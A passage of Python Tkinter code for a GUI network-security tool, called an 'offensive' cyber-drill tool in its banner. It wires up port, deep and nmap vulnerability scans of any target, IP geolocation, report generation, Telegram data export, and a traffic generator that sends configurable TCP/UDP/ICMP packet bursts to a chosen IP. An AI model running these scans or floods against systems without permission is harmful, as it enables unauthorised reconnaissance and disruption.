        self.threats_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Threat statistics
        stats_frame = ttk.LabelFrame(self.threat_tab, text="Threat Statistics")
        stats_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.stats_text = scrolledtext.ScrolledText(stats_frame, height=8)
        self.stats_text.pack(fill=tk.X, padx=5, pady=5)
    
    def create_network_monitor_tab(self):
        """Create network monitor tab"""
        self.monitor_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.monitor_tab, text="Network Monitor")
        
        # Real-time stats
        stats_frame = ttk.LabelFrame(self.monitor_tab, text="Real-time Statistics")
        stats_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Create stats display
        self.stats_labels = {}
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        stats_info = [
            ("Packets Processed:", "packets"),
            ("Packet Rate:", "rate"),
            ("TCP Packets:", "tcp"),
            ("UDP Packets:", "udp"),
            ("ICMP Packets:", "icmp"),
            ("Threats Detected:", "threats"),
            ("Monitoring Time:", "uptime")
        ]
        
        for i, (label_text, key) in enumerate(stats_info):
            row = i % 4
            col = i // 4
            
            frame = ttk.Frame(stats_grid)
            frame.grid(row=row, column=col, sticky=tk.W, padx=20, pady=10)
            
            ttk.Label(frame, text=label_text, font=('Arial', 10, 'bold')).pack(side=tk.LEFT)
            self.stats_labels[key] = ttk.Label(frame, text="0", font=('Arial', 10))
            self.stats_labels[key].pack(side=tk.LEFT, padx=5)
        
        # Packet log
        log_frame = ttk.LabelFrame(self.monitor_tab, text="Packet Log")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.packet_log = scrolledtext.ScrolledText(log_frame, height=10)
        self.packet_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_scanner_tab(self):
        """Create network scanner tab"""
        self.scanner_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.scanner_tab, text="Network Scanner")
        
        # Scanner controls
        control_frame = ttk.LabelFrame(self.scanner_tab, text="Scanner Controls")
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Target input
        target_frame = ttk.Frame(control_frame)
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Target:").pack(side=tk.LEFT, padx=5)
        self.scan_target_entry = ttk.Entry(target_frame, width=30)
        self.scan_target_entry.pack(side=tk.LEFT, padx=5)
        
        # Port range
        port_frame = ttk.Frame(control_frame)
        port_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(port_frame, text="Ports:").pack(side=tk.LEFT, padx=5)
        self.port_range_entry = ttk.Entry(port_frame, width=15)
        self.port_range_entry.pack(side=tk.LEFT, padx=5)
        self.port_range_entry.insert(0, "1-1000")
        
        # Scan buttons
        button_frame = ttk.Frame(control_frame)
        button_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(button_frame, text="Ping", command=self.run_ping).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Port Scan", command=self.run_port_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Deep Scan", command=self.run_deep_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Traceroute", command=self.run_traceroute).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Vulnerability Scan", command=self.run_vuln_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Get Location", command=self.get_ip_location).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Analyse", command=self.run_analyse).pack(side=tk.LEFT, padx=5)
        
        # Results display
        results_frame = ttk.LabelFrame(self.scanner_tab, text="Scan Results")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.scan_results = scrolledtext.ScrolledText(results_frame, wrap=tk.WORD)
        self.scan_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_terminal_tab(self):
        """Create terminal emulator tab"""
        self.terminal_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.terminal_tab, text="Terminal")
        
        # Terminal output
        self.terminal_output = scrolledtext.ScrolledText(self.terminal_tab, wrap=tk.WORD, state='disabled')
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Terminal input
        input_frame = ttk.Frame(self.terminal_tab)
        input_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(input_frame, text=">").pack(side=tk.LEFT, padx=5)
        self.terminal_input = ttk.Entry(input_frame)
        self.terminal_input.pack(fill=tk.X, expand=True, padx=5)
        self.terminal_input.bind('<Return>', self.execute_terminal_command)
        
        # Help button
        ttk.Button(input_frame, text="Help", command=self.show_terminal_help).pack(side=tk.RIGHT, padx=5)
    
    def create_reports_tab(self):
        """Create reports tab"""
        self.reports_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.reports_tab, text="Reports")
        
        # Report controls
        control_frame = ttk.LabelFrame(self.reports_tab, text="Report Generation")
        control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        button_frame = ttk.Frame(control_frame)
        button_frame.pack(padx=5, pady=10)
        
        ttk.Button(button_frame, text="Generate Threat Report", 
                  command=self.generate_threat_report).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Generate Network Report",
                  command=self.generate_network_report).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Generate Full Report",
                  command=self.generate_full_report).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Daily Report",
                  command=lambda: self.generate_period_report('day')).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Weekly Report",
                  command=lambda: self.generate_period_report('week')).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Monthly Report",
                  command=lambda: self.generate_period_report('month')).pack(side=tk.LEFT, padx=5)
        
        # Reports display
        reports_frame = ttk.LabelFrame(self.reports_tab, text="Generated Reports")
        reports_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.reports_display = scrolledtext.ScrolledText(reports_frame, wrap=tk.WORD)
        self.reports_display.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_telegram_tab(self):
        """Create Telegram integration tab"""
        self.telegram_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.telegram_tab, text="Telegram")
        
        # Telegram configuration
        config_frame = ttk.LabelFrame(self.telegram_tab, text="Telegram Configuration")
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Token configuration
        token_frame = ttk.Frame(config_frame)
        token_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(token_frame, text="Bot Token:").pack(side=tk.LEFT, padx=5)
        self.token_entry = ttk.Entry(token_frame, width=40, show="*")
        self.token_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        ttk.Button(token_frame, text="Set Token", command=self.set_telegram_token).pack(side=tk.LEFT, padx=5)
        
        # Chat ID configuration
        chat_frame = ttk.Frame(config_frame)
        chat_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(chat_frame, text="Chat ID:").pack(side=tk.LEFT, padx=5)
        self.chat_id_entry = ttk.Entry(chat_frame, width=20)
        self.chat_id_entry.pack(side=tk.LEFT, padx=5)
        ttk.Button(chat_frame, text="Set Chat ID", command=self.set_telegram_chat_id).pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        control_frame = ttk.Frame(config_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="Test Connection", 
                  command=self.test_telegram_connection).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Get Status",
                  command=self.show_telegram_status).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Send Test Message",
                  command=self.send_test_telegram_message).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Export Data",
                  command=self.export_telegram_data).pack(side=tk.LEFT, padx=5)
        
        # Status display
        status_frame = ttk.LabelFrame(self.telegram_tab, text="Telegram Status")
        status_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.telegram_status = scrolledtext.ScrolledText(status_frame, wrap=tk.WORD, height=10)
        self.telegram_status.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def apply_theme(self):
        """Apply current theme to GUI"""
        theme = THEMES[self.current_theme]
        
        # Configure ttk styles
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('TFrame', background=theme['bg'])
        style.configure('TLabel', background=theme['bg'], foreground=theme['fg'])
        style.configure('TLabelframe', background=theme['bg'], foreground=theme['fg'])
        style.configure('TLabelframe.Label', background=theme['bg'], foreground=theme['fg'])
        
        # Configure text widgets
        text_widgets = [self.stats_text, self.packet_log, self.scan_results, 
                       self.terminal_output, self.reports_display, self.telegram_status]
        
        for widget in text_widgets:
            widget.configure(
                background=theme['text_bg'],
                foreground=theme['text_fg'],
                insertbackground=theme['fg']
            )
    
    def switch_theme(self):
        """Switch between dark and light themes"""
        self.current_theme = "light" if self.current_theme == "dark" else "dark"
        self.apply_theme()
    
    def start_monitoring(self):
        """Start network monitoring"""
        target_ip = self.monitor_ip_entry.get().strip()
        if target_ip and not self.validate_ip(target_ip):
            messagebox.showerror("Error", "Invalid IP address")
            return
        
        if self.monitor.start_monitoring(target_ip):
            self.start_monitor_btn.config(state=tk.DISABLED)
            self.stop_monitor_btn.config(state=tk.NORMAL)
            self.log_message(f"Started monitoring {target_ip if target_ip else 'all traffic'}")
        else:
            messagebox.showwarning("Warning", "Monitoring is already active")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitor.stop_monitoring()
        self.start_monitor_btn.config(state=tk.NORMAL)
        self.stop_monitor_btn.config(state=tk.DISABLED)
        self.log_message("Stopped network monitoring")
    
    def run_ping(self):
        """Run ping command"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Pinging {target}...\n")
        self.scan_results.see(tk.END)
        
        def do_ping():
            result = self.scanner.ping_ip(target)
            self.scan_results.insert(tk.END, result + "\n")
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_ping, daemon=True).start()
    
    def run_port_scan(self):
        """Run port scan"""
        target = self.scan_target_entry.get().strip()
        ports = self.port_range_entry.get().strip()
        
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        if not self.validate_ip(target):
            messagebox.showerror("Error", "Invalid IP address")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Scanning {target} ports {ports}...\n")
        self.scan_results.see(tk.END)
        
        def do_scan():
            result = self.scanner.port_scan(target, ports)
            if result['success']:
                open_ports = result.get('open_ports', [])
                self.scan_results.insert(tk.END, f"\nScan completed. Open ports: {len(open_ports)}\n")
                for port in open_ports:
                    self.scan_results.insert(tk.END, 
                        f"Port {port['port']}: {port['service']}\n")
            else:
                self.scan_results.insert(tk.END, f"Error: {result.get('error', 'Unknown')}\n")
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_scan, daemon=True).start()
    
    def run_deep_scan(self):
        """Run deep scan"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Deep scanning {target}...\n")
        self.scan_results.see(tk.END)
        
        def do_deep_scan():
            result = self.scanner.deep_scan_ip(target)
            if result['success']:
                open_ports = result.get('open_ports', [])
                self.scan_results.insert(tk.END, f"\nDeep scan completed. Open ports: {len(open_ports)}\n")
                for port in open_ports[:20]:  # Show first 20 ports
                    service_info = result['services'].get(port, {})
                    name = service_info.get('name', 'unknown')
                    product = service_info.get('product', '')
                    version = service_info.get('version', '')
                    self.scan_results.insert(tk.END, 
                        f"Port {port}: {name} {product} {version}\n".strip() + "\n")
            else:
                self.scan_results.insert(tk.END, f"Error: {result.get('error', 'Unknown')}\n")
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_deep_scan, daemon=True).start()
    
    def run_traceroute(self):
        """Run traceroute"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Traceroute to {target}...\n")
        self.scan_results.see(tk.END)
        
        def do_trace():
            result = self.scanner.traceroute(target)
            self.scan_results.insert(tk.END, result + "\n")
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_trace, daemon=True).start()
    
    def run_vuln_scan(self):
        """Run vulnerability scan"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        if not NMAP_AVAILABLE:
            messagebox.showerror("Error", "Nmap not available")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Running vulnerability scan on {target}...\n")
        self.scan_results.see(tk.END)
        
        def do_vuln_scan():
            result = self.scanner.vulnerability_scan(target)
            if result['success']:
                vulns = result.get('vulnerabilities', [])
                self.scan_results.insert(tk.END, f"\nVulnerabilities found: {len(vulns)}\n")
                for vuln in vulns:
                    self.scan_results.insert(tk.END, f"• {vuln}\n")
            else:
                self.scan_results.insert(tk.END, f"Error: {result.get('error', 'Unknown')}\n")
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_vuln_scan, daemon=True).start()
    
    def get_ip_location(self):
        """Get IP location"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Getting location for {target}...\n")
        self.scan_results.see(tk.END)
        
        def do_location():
            result = self.scanner.get_ip_location(target)
            self.scan_results.insert(tk.END, result + "\n")
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_location, daemon=True).start()
    
    def run_analyse(self):
        """Run deep analysis"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target")
            return
        
        self.scan_results.delete(1.0, tk.END)
        self.scan_results.insert(tk.END, f"Analyzing {target}...\n")
        self.scan_results.see(tk.END)
        
        def do_analyse():
            # Ping
            self.scan_results.insert(tk.END, "1. Ping Test:\n")
            self.scan_results.insert(tk.END, self.scanner.ping_ip(target) + "\n\n")
            
            # Quick Scan
            self.scan_results.insert(tk.END, "2. Quick Port Scan:\n")
            result = self.scanner.scan_ip(target)
            if result['success']:
                self.scan_results.insert(tk.END, f"   Open ports: {len(result.get('open_ports', []))}\n")
            else:
                self.scan_results.insert(tk.END, "   Scan failed\n")
            
            # Location
            self.scan_results.insert(tk.END, "\n3. Location Information:\n")
            self.scan_results.insert(tk.END, self.scanner.get_ip_location(target))
            
            self.scan_results.see(tk.END)
        
        threading.Thread(target=do_analyse, daemon=True).start()
    
    def execute_terminal_command(self, event=None):
        """Execute terminal command"""
        command = self.terminal_input.get()
        self.terminal_input.delete(0, tk.END)
        
        if not command:
            return
        
        # Create terminal emulator
        from cyber_tool import NetworkTrafficGenerator
        traffic_generator = NetworkTrafficGenerator(self.db_manager)
        terminal = TerminalEmulator(self.scanner, self.monitor, traffic_generator, self.telegram_manager)
        
        # Display command
        self.terminal_output.config(state='normal')
        self.terminal_output.insert(tk.END, f"> {command}\n")
        
        # Execute command
        result = terminal.execute(command)
        if result:  # Don't show empty results
            self.terminal_output.insert(tk.END, f"{result}\n")
        
        self.terminal_output.see(tk.END)
        self.terminal_output.config(state='disabled')
        
        # Handle exit command
        if command.lower() == 'exit':
            self.root.after(1000, self.root.quit)
    
    def show_terminal_help(self):
        """Show terminal help"""
        from cyber_tool import NetworkTrafficGenerator
        traffic_generator = NetworkTrafficGenerator(self.db_manager)
        terminal = TerminalEmulator(self.scanner, self.monitor, traffic_generator, self.telegram_manager)
        help_text = terminal.cmd_help([])
        
        self.terminal_output.config(state='normal')
        self.terminal_output.insert(tk.END, help_text + "\n")
        self.terminal_output.see(tk.END)
        self.terminal_output.config(state='disabled')
    
    def generate_threat_report(self):
        """Generate threat report"""
        threats = self.db_manager.get_recent_intrusions(100)
        
        report = "THREAT REPORT\n"
        report += "=" * 50 + "\n"
        report += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        report += f"Total Threats: {len(threats)}\n\n"
        
        # Threat statistics
        threat_stats = self.db_manager.get_threat_stats(24)
        report += "Threat Statistics (Last 24 hours):\n"
        for threat_type, count in threat_stats.items():
            report += f"  {threat_type}: {count}\n"
        
        report += "\nRecent Threats:\n"
        for timestamp, source_ip, threat_type, severity, description in threats:
            report += f"{timestamp} - {source_ip} - {threat_type} ({severity})\n"
            if description:
                report += f"  {description}\n"
        
        self.reports_display.delete(1.0, tk.END)
        self.reports_display.insert(tk.END, report)
        
        # Save to file
        filename = f"threat_report_{int(time.time())}.txt"
        os.makedirs(REPORT_DIR, exist_ok=True)
        filepath = os.path.join(REPORT_DIR, filename)
        
        with open(filepath, 'w') as f:
            f.write(report)
        
        self.log_message(f"Threat report saved to {filename}")
    
    def generate_network_report(self):
        """Generate network report"""
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Get network stats
        cursor.execute('''
            SELECT timestamp, packets_processed, packet_rate, threat_count
            FROM network_stats 
            WHERE timestamp > datetime('now', '-24 hours')
            ORDER BY timestamp
        ''')
        stats = cursor.fetchall()
        
        report = "NETWORK REPORT\n"
        report += "=" * 50 + "\n"
        report += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        
        if stats:
            total_packets = sum(row[1] for row in stats)
            avg_rate = sum(row[2] for row in stats) / len(stats) if stats else 0
            total_threats = sum(row[3] for row in stats)
            
            report += f"Total Packets (24h): {total_packets:,}\n"
            report += f"Average Packet Rate: {avg_rate:.2f}/s\n"
            report += f"Total Threats (24h): {total_threats}\n"
        
        conn.close()
        
        self.reports_display.delete(1.0, tk.END)
        self.reports_display.insert(tk.END, report)
        
        # Save to file
        filename = f"network_report_{int(time.time())}.txt"
        os.makedirs(REPORT_DIR, exist_ok=True)
        filepath = os.path.join(REPORT_DIR, filename)
        
        with open(filepath, 'w') as f:
            f.write(report)
        
        self.log_message(f"Network report saved to {filename}")
    
    def generate_period_report(self, period: str):
        """Generate period report"""
        from cyber_tool import NetworkTrafficGenerator
        traffic_generator = NetworkTrafficGenerator(self.db_manager)
        terminal = TerminalEmulator(self.scanner, self.monitor, traffic_generator, self.telegram_manager)
        
        if period == 'day':
            result = terminal.cmd_generate_day_report([])
        elif period == 'week':
            result = terminal.cmd_generate_weekly_report([])
        elif period == 'month':
            result = terminal.cmd_generate_monthly_report([])
        else:
            result = f"Invalid period: {period}"
        
        self.reports_display.delete(1.0, tk.END)
        self.reports_display.insert(tk.END, result)
    
    def generate_full_report(self):
        """Generate full comprehensive report"""
        self.generate_threat_report()
        threat_report = self.reports_display.get(1.0, tk.END)
        
        self.generate_network_report()
        network_report = self.reports_display.get(1.0, tk.END)
        
        full_report = "FULL SECURITY REPORT\n"
        full_report += "=" * 60 + "\n\n"
        full_report += network_report + "\n"
        full_report += threat_report
        
        self.reports_display.delete(1.0, tk.END)
        self.reports_display.insert(tk.END, full_report)
        
        # Save to file
        filename = f"full_report_{int(time.time())}.txt"
        os.makedirs(REPORT_DIR, exist_ok=True)
        filepath = os.path.join(REPORT_DIR, filename)
        
        with open(filepath, 'w') as f:
            f.write(full_report)
        
        self.log_message(f"Full report saved to {filename}")
    
    def set_telegram_token(self):
        """Set Telegram bot token"""
        token = self.token_entry.get().strip()
        if not token:
            messagebox.showerror("Error", "Please enter a bot token")
            return
        
        result = self.telegram_manager.config_telegram_token(token)
        self.telegram_status.delete(1.0, tk.END)
        self.telegram_status.insert(tk.END, result)
    
    def set_telegram_chat_id(self):
        """Set Telegram chat ID"""
        chat_id = self.chat_id_entry.get().strip()
        if not chat_id:
            messagebox.showerror("Error", "Please enter a chat ID")
            return
        
        result = self.telegram_manager.config_telegram_chat_id(chat_id)
        self.telegram_status.delete(1.0, tk.END)
        self.telegram_status.insert(tk.END, result)
    
    def test_telegram_connection(self):
        """Test Telegram connection"""
        result = self.telegram_manager.test_telegram_connection()
        self.telegram_status.delete(1.0, tk.END)
        self.telegram_status.insert(tk.END, result)
    
    def show_telegram_status(self):
        """Show Telegram status"""
        result = self.telegram_manager.get_telegram_status()
        self.telegram_status.delete(1.0, tk.END)
        self.telegram_status.insert(tk.END, result)
    
    def send_test_telegram_message(self):
        """Send test Telegram message"""
        test_message = "🔒 Cyber Security Tool Test Message\n" \
                      "Timestamp: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n" \
                      "Status: Operational\n" \
                      "This is a test of the Telegram integration."
        
        if self.telegram_manager.send_telegram_message(test_message):
            self.telegram_status.delete(1.0, tk.END)
            self.telegram_status.insert(tk.END, "✅ Test message sent successfully")
        else:
            self.telegram_status.delete(1.0, tk.END)
            self.telegram_status.insert(tk.END, "❌ Failed to send test message")
    
    def export_telegram_data(self):
        """Export data via Telegram"""
        result = self.telegram_manager.export_data()
        self.telegram_status.delete(1.0, tk.END)
        self.telegram_status.insert(tk.END, result)
    
    def update_dashboard(self):
        """Update dashboard with current information"""
        # Update threat list
        self.update_threat_list()
        
        # Update statistics
        self.update_statistics()
        
        # Update network stats
        self.update_network_stats()
        
        # Schedule next update
        self.root.after(self.update_interval, self.update_dashboard)
    
    def update_threat_list(self):
        """Update the threat list display"""
        # Clear current items
        for item in self.threats_tree.get_children():
            self.threats_tree.delete(item)
        
        # Get recent threats
        threats = self.db_manager.get_recent_intrusions(20)
        
        # Add threats to treeview
        for timestamp, source_ip, threat_type, severity, description in threats:
            self.threats_tree.insert('', 'end', values=(
                timestamp,
                source_ip,
                threat_type,
                severity,
                description[:50] + "..." if len(description) > 50 else description
            ))
    
    def update_statistics(self):
        """Update threat statistics"""
        threat_stats = self.db_manager.get_threat_stats(1)  # Last hour
        
        stats_text = "Threat Statistics (Last Hour):\n"
        stats_text += "-" * 30 + "\n"
        
        if threat_stats:
            for threat_type, count in threat_stats.items():
                stats_text += f"{threat_type}: {count}\n"
        else:
            stats_text += "No threats detected\n"
        
        # Add monitoring status
        stats = self.monitor.get_current_stats()
        stats_text += f"\nMonitoring Status: {'Active' if stats['is_monitoring'] else 'Inactive'}\n"
        if stats['is_monitoring']:
            stats_text += f"Target: {stats['target_ip'] or 'All traffic'}\n"
            stats_text += f"Threats Detected: {stats['threats_detected']}\n"
        
        self.stats_text.delete(1.0, tk.END)
        self.stats_text.insert(tk.END, stats_text)
    
    def update_network_stats(self):
        """Update network statistics display"""
        stats = self.monitor.get_current_stats()
        
        # Update labels
        self.stats_labels['packets'].config(text=f"{stats['packets_processed']:,}")
        self.stats_labels['rate'].config(text=f"{stats['packet_rate']:.2f}/s")
        self.stats_labels['tcp'].config(text=f"{stats['tcp_packets']:,}")
        self.stats_labels['udp'].config(text=f"{stats['udp_packets']:,}")
        self.stats_labels['icmp'].config(text=f"{stats['icmp_packets']:,}")
        self.stats_labels['threats'].config(text=f"{stats['threats_detected']:,}")
        
        # Format uptime
        if stats['uptime'] > 0:
            hours = int(stats['uptime'] // 3600)
            minutes = int((stats['uptime'] % 3600) // 60)
            seconds = int(stats['uptime'] % 60)
            uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        else:
            uptime_str = "00:00:00"
        
        self.stats_labels['uptime'].config(text=uptime_str)
    
    def log_message(self, message: str):
        """Log message to packet log"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.packet_log.insert(tk.END, f"[{timestamp}] {message}\n")
        self.packet_log.see(tk.END)
    
    def new_session(self):
        """Create new session"""
        if messagebox.askyesno("New Session", "Start a new monitoring session?"):
            self.monitor.stop_monitoring()
            self.monitor_ip_entry.delete(0, tk.END)
            self.log_message("New session started")
    
    def save_session(self):
        """Save current session"""
        file_path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                session_data = {
                    'target_ip': self.monitor_ip_entry.get(),
                    'scan_target': self.scan_target_entry.get(),
                    'port_range': self.port_range_entry.get(),
                    'timestamp': datetime.now().isoformat()
                }
                
                with open(file_path, 'w') as f:
                    json.dump(session_data, f, indent=4)
                
                self.log_message(f"Session saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save session: {str(e)}")
    
    def load_session(self):
        """Load saved session"""
        file_path = filedialog.askopenfilename(
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    session_data = json.load(f)
                
                self.monitor_ip_entry.delete(0, tk.END)
                self.monitor_ip_entry.insert(0, session_data.get('target_ip', ''))
                
                self.scan_target_entry.delete(0, tk.END)
                self.scan_target_entry.insert(0, session_data.get('scan_target', ''))
                
                self.port_range_entry.delete(0, tk.END)
                self.port_range_entry.insert(0, session_data.get('port_range', '1-1000'))
                
                self.log_message(f"Session loaded from {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load session: {str(e)}")
    
    def open_traffic_generator(self):
        """Open traffic generator window"""
        if not GUI_AVAILABLE:
            messagebox.showerror("Error", "GUI features not available")
            return
        
        traffic_window = tk.Toplevel(self.root)
        traffic_window.title("Traffic Generator")
        
        # Create traffic generator instance
        traffic_gen = NetworkTrafficGenerator(self.db_manager)
        
        # Create GUI for traffic generator
        traffic_window.geometry("600x400")
        
        main_frame = ttk.Frame(traffic_window, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Target configuration
        ttk.Label(main_frame, text="Target IP:").grid(row=0, column=0, sticky=tk.W, pady=5)
        target_entry = ttk.Entry(main_frame, width=20)
        target_entry.grid(row=0, column=1, sticky=tk.W, pady=5, padx=5)
        
        ttk.Label(main_frame, text="Port:").grid(row=1, column=0, sticky=tk.W, pady=5)
        port_entry = ttk.Entry(main_frame, width=10)
        port_entry.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        port_entry.insert(0, "80")
        
        # Traffic type
        ttk.Label(main_frame, text="Traffic Type:").grid(row=2, column=0, sticky=tk.W, pady=5)
        traffic_type = ttk.Combobox(main_frame, values=["TCP", "UDP", "ICMP"], width=10)
        traffic_type.grid(row=2, column=1, sticky=tk.W, pady=5, padx=5)
        traffic_type.current(0)
        
        # Packet configuration
        ttk.Label(main_frame, text="Packet Count:").grid(row=3, column=0, sticky=tk.W, pady=5)
        packet_count = ttk.Entry(main_frame, width=10)
        packet_count.grid(row=3, column=1, sticky=tk.W, pady=5, padx=5)
        packet_count.insert(0, "100")
        
        ttk.Label(main_frame, text="Delay (ms):").grid(row=4, column=0, sticky=tk.W, pady=5)
        delay_entry = ttk.Entry(main_frame, width=10)
        delay_entry.grid(row=4, column=1, sticky=tk.W, pady=5, padx=5)
        delay_entry.insert(0, "10")
        
        # Output console
        output_text = scrolledtext.ScrolledText(main_frame, width=70, height=10)
        output_text.grid(row=5, column=0, columnspan=2, pady=10)
        
        def log_output(message):
            output_text.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
            output_text.see(tk.END)
        
        def start_traffic():
            target = target_entry.get().strip()
            traffic_type_val = traffic_type.get()
            
            if not target:
                messagebox.showerror("Error", "Please enter a target IP")
                return
            
            try:
                packet_count_val = int(packet_count.get())
                delay_val = float(delay_entry.get()) / 1000
            except ValueError:
                messagebox.showerror("Error", "Invalid numeric values")
                return
            
            log_output(f"Starting {traffic_type_val} traffic to {target}...")
            
            def traffic_thread():
                try:
                    if traffic_type_val == "TCP":
                        port = int(port_entry.get())
                        result = traffic_gen.generate_tcp_traffic(target, port, packet_count_val, delay_val)
                    elif traffic_type_val == "UDP":
                        port = int(port_entry.get())
                        result = traffic_gen.generate_udp_traffic(target, port, packet_count_val, delay_val)
                    elif traffic_type_val == "ICMP":
                        result = traffic_gen.generate_icmp_traffic(target, packet_count_val, delay_val)
                    else:
                        result = "❌ Unknown traffic type"
                    
                    log_output(result)
                    
                except Exception as e:
                    log_output(f"❌ Error: {str(e)}")
            
            thread = threading.Thread(target=traffic_thread, daemon=True)
            thread.start()
        
        # Control buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=6, column=0, columnspan=2, pady=10)
        
        ttk.Button(button_frame, text="Start Traffic", command=start_traffic).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="Stop Traffic", command=traffic_gen.stop_traffic).pack(side=tk.LEFT, padx=5)
    
    def open_port_scanner(self):
        """Open port scanner"""
        self.notebook.select(self.scanner_tab)
    
    def open_vulnerability_scanner(self):
        """Open vulnerability scanner"""
        target = self.scan_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target in the Scanner tab")
            self.notebook.select(self.scanner_tab)
            return
        
        self.run_vuln_scan()
    
    @staticmethod
    def validate_ip(ip: str) -> bool:
        """Validate IP address"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

def print_banner():
    """Print enhanced banner"""
    banner = f"""
{Colors.GREEN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║           🛡️  ACCURATE CYBER DRILL OFFENSIVE TOOL v{VERSION}           🛡️          ║
║                                                                                  ║
║      Network Monitoring • Intrusion Detection • Traffic Generation               ║
║         Security Analysis • Threat Detection • Vulnerability Scan                ║
║                    Telegram Integration • Advanced Reporting                     ║
║                                                                                  ║
║   Author: Ian Carter Kulani              Community: Accurate Cyber Defense       ║
